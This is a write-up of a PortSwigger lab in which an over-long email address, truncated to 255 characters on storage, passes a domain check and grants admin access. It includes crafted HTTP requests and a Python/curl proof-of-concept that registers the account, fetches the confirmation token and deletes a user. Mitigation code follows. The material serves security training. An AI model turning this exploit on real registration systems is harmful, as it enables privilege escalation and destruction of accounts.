# Lab 06: Inconsistent Handling of Exceptional Input

> **Topic**: Business Logic Vulnerabilities
> **Lab Number**: 06
> **Platform**: PortSwigger Web Security Academy

## Category
Business Logic — Email Truncation to Bypass Domain-Based Access Control

## Vulnerability Summary
The application grants admin access to users whose registered email ends in `@dontwannacry.com`. The registration flow sends a confirmation email to the address provided, but stores the email in the database truncated to **255 characters**. By crafting an email address where `@dontwannacry.com` occupies exactly characters 239–255, the confirmation email is delivered to an attacker-controlled mail server (the full address is used for delivery), while the stored address is truncated to end in `@dontwannacry.com` — granting admin privileges.

## Attack Methodology

### Step 1: Discover the Admin Panel
Browsing to `/admin` returns an error:

```
Admin interface only available if logged in as a DontWannaCry user
```

The registration page also hints: *"If you work for DontWannaCry, please use your @dontwannacry.com email address."*

### Step 2: Identify the Truncation Limit
Register with a 200+ character email address:

```
aaaa...aaa@<exploit-server>.exploit-server.net   (200+ chars)
```

After confirming and logging in, the **My account** page shows the stored email truncated to **255 characters**.

### Step 3: Calculate the Exact Padding

The goal: craft an email where the first 255 characters are `<padding>@dontwannacry.com`, and the remainder routes delivery to the attacker's mail server.

```
Format:  <padding>@dontwannacry.com.<exploit-server>.exploit-server.net
Truncated to 255: <padding>@dontwannacry.com
```

```python
domain_part = '@dontwannacry.com'   # 17 chars
prefix_len  = 255 - 17              # = 238 'a' characters
```

Full email (315 chars, delivers to attacker server):
```
aaa...aaa@dontwannacry.com.exploit-0a1600c304a3b0b682c8327f012100ed.exploit-server.net
^^^238^^^
```

Stored email after truncation (255 chars):
```
aaa...aaa@dontwannacry.com
^^^238^^^
```

### Step 4: Register the Crafted Account

```http
POST /register HTTP/2
Host: 0ae80008040fb0e782923374004100b8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&username=attacker&email=aaa...238a@dontwannacry.com.exploit-0a1600c304a3b0b682c8327f012100ed.exploit-server.net&password=Password123
```

Response: *"Please check your emails for your account registration link"*

### Step 5: Confirm via Email Client
The confirmation email is delivered to the exploit server (full address used for SMTP delivery). Clicked the registration link:

```
GET /register?temp-registration-token=wz4Bhf7q9nKyT1M5L81FvABrLFXAmWKe
```

Response: *"Account registration successful!"*

### Step 6: Log In and Access Admin Panel
Logged in as the new account. The stored email shows `aaa...@dontwannacry.com` — the application grants admin access.

```http
GET /admin HTTP/2
```

Admin panel accessible. ✅

### Step 7: Delete carlos

```http
GET /admin/delete?username=carlos HTTP/2
```

Response: **Lab solved.**

## Technical Root Cause

### Vulnerable Implementation (Pseudocode)
```python
def register(email, username, password):
    send_confirmation_email(to=email)          # full address used for delivery
    db.insert(email=email[:255], ...)          # truncated on storage
    
def is_admin(user):
    return user.email.endswith('@dontwannacry.com')  # checks stored (truncated) value
```

The flaw: the email used for **delivery** and the email used for **access control** are derived from the same input at different points, with a transformation (truncation) applied only to the stored copy.

### Secure Implementation (Pseudocode)
```python
def register(email, username, password):
    if len(email) > 255:
        raise ValidationError("Email address too long")
    send_confirmation_email(to=email)
    db.insert(email=email, ...)
```

Reject oversized input at the boundary — never silently truncate data that is used for security decisions.

### Attack Flow

```
Input email (315 chars):
  aaa...238...aaa @ dontwannacry.com . exploit-server.net
  └─────────────────────────────────────────────────────┘
                    SMTP delivery → attacker receives confirmation

Stored email (255 chars, truncated):
  aaa...238...aaa @ dontwannacry.com
                    └──────────────┘
                    endswith check → ADMIN ACCESS GRANTED ✅
```

## Impact
- **Full Admin Privilege Escalation**: Any attacker with access to any mail server can register as a `@dontwannacry.com` employee
- **No Authentication Bypass Required**: The registration flow works as intended — the truncation is the only flaw
- **Arbitrary User Deletion**: Admin panel allows deleting any user account

**Severity: High**

## Proof of Concept

```python
import subprocess, re

BASE = "https://0ae80008040fb0e782923374004100b8.web-security-academy.net"
EXPLOIT = "https://exploit-0a1600c304a3b0b682c8327f012100ed.exploit-server.net"
COOKIE = "/tmp/cookies.txt"

# Craft email: 238 'a's + @dontwannacry.com + .<exploit-server>
email = 'a' * 238 + '@dontwannacry.com.' + 'exploit-0a1600c304a3b0b682c8327f012100ed.exploit-server.net'
# len(email[:255]) == 255, email[:255].endswith('@dontwannacry.com') == True

# 1. Register
csrf = get_csrf(f"{BASE}/register")
subprocess.run(["curl", "-s", "-c", COOKIE, "-b", COOKIE, f"{BASE}/register",
                "-d", f"csrf={csrf}&username=attacker&email={email}&password=Password123"],
               capture_output=True)

# 2. Get confirmation token from email client
html = subprocess.run(["curl", "-s", f"{EXPLOIT}/email"],
                      capture_output=True, text=True).stdout
token = re.search(r'temp-registration-token=([a-zA-Z0-9]+)', html).group(1)

# 3. Confirm registration
subprocess.run(["curl", "-s", "-b", COOKIE, "-L", f"{BASE}/register?temp-registration-token={token}"],
               capture_output=True)

# 4. Login and delete carlos
csrf = get_csrf(f"{BASE}/login")
subprocess.run(["curl", "-s", "-c", COOKIE, "-b", COOKIE, "-L", f"{BASE}/login",
                "-d", f"csrf={csrf}&username=attacker&password=Password123"],
               capture_output=True)
subprocess.run(["curl", "-s", "-b", COOKIE, "-L", f"{BASE}/admin/delete?username=carlos"],
               capture_output=True)
```

## Key Takeaways
1. **Truncation Is a Transformation — Treat It as One**: Any time data is stored in a shorter form than it was received, the stored form may no longer represent the original. Security checks must use the same representation as the one being validated.
2. **Validate Length at the Input Boundary**: Reject inputs that exceed storage limits rather than silently truncating. A 315-character email that becomes a 255-character `@dontwannacry.com` address is a direct consequence of accepting oversized input.
3. **Domain-Based Access Control Is Weak Without Verification**: Granting privileges based on an email domain assumes the domain check is unforgeable. Any path that allows an attacker to control the stored domain value (truncation, subdomain confusion, etc.) breaks this assumption.
4. **Delivery Address ≠ Identity**: The address used to deliver a confirmation email and the address stored as the user's identity must be identical. If any transformation is applied between them, the confirmation proves ownership of the delivery address, not the stored one.

## Mitigation

### 1. Reject Oversized Input
```python
MAX_EMAIL_LENGTH = 254  # RFC 5321 limit

def register(email, ...):
    if len(email) > MAX_EMAIL_LENGTH:
        return error("Email address is too long")
```

### 2. Store and Check the Same Value
```python
# Store the exact email used for confirmation — no truncation
db.insert(email=email)  # enforce length at DB schema level with error propagation
```

### 3. Re-verify Domain Ownership for Privileged Domains
```python
PRIVILEGED_DOMAINS = {'dontwannacry.com'}

def grant_admin(user):
    domain = user.email.split('@')[-1]
    if domain in PRIVILEGED_DOMAINS:
        # Require additional out-of-band verification, not just email confirmation
        return user.domain_verified  # set only after manual review or SSO
    return False
```

## References
- [PortSwigger — Inconsistent Handling of Exceptional Input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
- [PortSwigger — Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-840: Business Logic Errors](https://cwe.mitre.org/data/definitions/840.html)
- [RFC 5321 — SMTP: Maximum Email Address Length](https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.3)

## Tools Used
- Burp Suite Professional (Proxy, content discovery)
- curl

---

*Lab completed on: 2026-05-04*  
*Writeup by vibhxr*
